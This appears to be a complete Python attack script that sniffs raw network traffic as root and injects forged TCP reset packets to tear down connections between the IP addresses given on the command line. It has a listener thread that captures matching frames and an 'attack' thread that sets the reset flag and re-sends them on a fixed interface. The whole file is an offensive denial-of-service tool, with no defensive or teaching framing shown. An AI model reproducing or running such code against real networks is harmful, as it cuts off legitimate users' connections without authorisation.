#!/usr/bin/env python3
import threading
import socket
from packet import EthernetFrame
from sys import exit, argv
from os import getuid
from time import time, sleep

if getuid() != 0:
    print("This script must be run as root so it can capture traffic.")
    exit(1)

attack_event = threading.Event()
attack_targets = []
attack_targets_lock = threading.Lock()

we_are = {"done here": False}


def listen():
    listen_socket = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.ntohs(0x0003)
    )

    while True:
        if we_are["done here"]:
            break

        try:
            frame = EthernetFrame(listen_socket.recv(65535))
        except ValueError:
            continue
        except socket.SocketError:
            # break
            raise

        ip = frame.payload
        tcp = ip.payload

        # ignore reset packets
        if tcp.RST:
            continue

        sender = str(ip.source_address)
        receiver = str(ip.dest_address)

        if sender not in argv and receiver not in argv:
            continue

        with attack_targets_lock:
            attack_targets.append(frame)
        attack_event.set()

        # with connections_lock:

        #     for connection in connections:
        #         if (
        #             not (sender == receiver) and
        #             sender in connection["participants"] and
        #             receiver in connection["participants"]
        #         ):
        #             connection["last packet"] = frame
        #             connection["last seen"] = time()
        #     else:
        #         connections.append({
        #             "participants": (
        #                 str(sender),
        #                 str(receiver)
        #             ),
        #             "last packet": frame,
        #             "last seen": time(),
        #             "attack": False,
        #             "prompted": False
        #         })

    listen_socket.close()


def attack():
    attack_socket = socket.socket(
        socket.AF_PACKET,
        socket.SOCK_RAW,
        socket.ntohs(0x0003)
    )

    attack_socket.bind(('enp0s8', 0))

    while True:
        attack_event.wait()

        if we_are["done here"]:
            break

        while attack_targets:
            with attack_targets_lock:
                target = attack_targets.pop(0)

            print("Attacking {} and {}.".format(
                target.payload.source_address,
                target.payload.dest_address
            ))

            target.payload.payload.forge_reset()
            attack_socket.send(target.raw())

        attack_event.clear()

    attack_socket.close()


listen_thread = threading.Thread(target=listen, name="listen", daemon=True)
listen_thread.start()
attack_thread = threading.Thread(target=attack, name="attack", daemon=True)
attack_thread.start()

try:
    while True:
        sleep(30)
except KeyboardInterrupt:
    we_are["done here"] = True
